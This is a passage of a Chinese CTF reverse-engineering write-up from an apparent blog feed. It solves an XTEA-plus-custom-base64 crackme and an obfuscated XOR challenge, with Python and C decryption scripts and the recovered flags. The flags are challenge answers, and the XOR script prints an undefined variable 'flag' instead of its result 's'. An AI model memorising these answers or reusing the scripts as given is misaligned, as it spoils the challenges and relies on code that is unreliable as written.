-<li>检测结果<br><img src="https://i.loli.net/2021/09/04/cM2YCPlRS9r7wgu.png" alt=""><br>总结一下，函数通过一种未知变换，再进行XTEA加密后，最后进行base64加密，与密文进行比较。<br>python解密脚本：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table  = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;248n4EJTTTEaceRT8kL8EAgoxIaKfvamSsOfg5EXusE&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to</span>(<span class="params">s</span>):</span></span><br><span class="line">    dd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        dd += (<span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">return</span> dd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        flag += (<span class="string">&#x27;&#123;:06b&#125;&#x27;</span>.<span class="built_in">format</span>(table.find(i)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">        flags.append(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flags), <span class="number">4</span>):</span><br><span class="line">        <span class="built_in">print</span>(to(flags[i:i+<span class="number">4</span>:][::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
-XTEA解密<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt_xtea</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + k[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12174208</span>, <span class="number">0x7adf778b</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v1[<span class="number">2</span>] = &#123;<span class="number">0x77ed300a</span>, <span class="number">0xa2c84b21</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v2[<span class="number">2</span>] = &#123;<span class="number">0xc2861844</span>, <span class="number">0x96f23dae</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v3[<span class="number">2</span>] = &#123;<span class="number">0x408fccd9</span>, <span class="number">0xca793b5a</span>&#125;;</span><br><span class="line">    <span class="comment">//uint32_t v[2] = &#123;0x33333333, 0x34343434&#125;;</span></span><br><span class="line">    <span class="comment">//uint32_t v[2] = &#123;0xa5884ef3, 0x6ea37aa2&#125;;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x6a</span>,<span class="number">0x78</span>,<span class="number">0x73</span>,<span class="number">0x7a</span>&#125;;</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v1, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v2, k);</span><br><span class="line">    decrypt_xtea(<span class="number">32</span>, v3, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v1[<span class="number">0</span>],v1[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v2[<span class="number">0</span>],v2[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx, %lx,&quot;</span>, v3[<span class="number">0</span>],v3[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-由于变换是类似交换的操作，是可逆的，所以将解密的数据直接输入，就可以在动态调试看到flag<br><img src="https://i.loli.net/2021/09/04/KnTsZwmv2rYG6oU.png" alt=""><br><em><code>flag&#123;f1bf4dfbfc4dc9df45b5da87d552ed02&#125;</code></em></li>
-</ul>
-<h2 id="before-main"><a href="#before-main" class="headerlink" title="before-main"></a>before-main</h2><p>这是最简单的题目，难点是无法反编译，存在花指令，只能看汇编，但只是一个简单的异或</p>
-<h3 id="花指令分析"><a href="#花指令分析" class="headerlink" title="花指令分析"></a>花指令分析</h3><p><img src="https://i.loli.net/2021/09/04/pQAlB8KMUZuzrP2.png" alt=""><br>还是存在几个花指令，nop掉之后，还是存在栈不平衡，但是只有存在异或操作<br><img src="https://i.loli.net/2021/09/04/z2UGkaeNfZKyYsF.png" alt=""><br>异或的密文为<code>0x00403138</code>处的数据:<br><img src="https://i.loli.net/2021/09/04/7KBHjuSrQh1msYV.png" alt=""><br>key具有迷惑性，为<code>dword_404018</code>处的数据，但是在<code>0x401075</code>处进行修改了<br><img src="https://i.loli.net/2021/09/04/YwFvHtoNDVu8kgq.png" alt=""><br><img src="https://i.loli.net/2021/09/04/3ntJmDp5rieYk96.png" alt=""><br>key最终为：<code>[122, 115, 120, 106]</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0x1C</span>, <span class="number">0x1F</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x5F</span>, <span class="number">0x00</span>, <span class="number">0x2C</span>, <span class="number">0x09</span>, <span class="number">0x1D</span>, <span class="number">0x1F</span>, <span class="number">0x2C</span>, <span class="number">0x11</span>, <span class="number">0x58</span>, <span class="number">0x49</span>, <span class="number">0x12</span>, <span class="number">0x0B</span>, <span class="number">0x17</span>]</span><br><span class="line">key = [<span class="number">122</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">106</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc)):</span><br><span class="line">  s += (<span class="built_in">chr</span>(enc[i]^key[i%<span class="number">4</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;jx5z_qwe_i23as&#125;</span></span><br></pre></td></tr></table></figure>
-<p><em><code>flag&#123;jx5z_qwe_i23as&#125;</code></em></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>RE</tag>
-        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
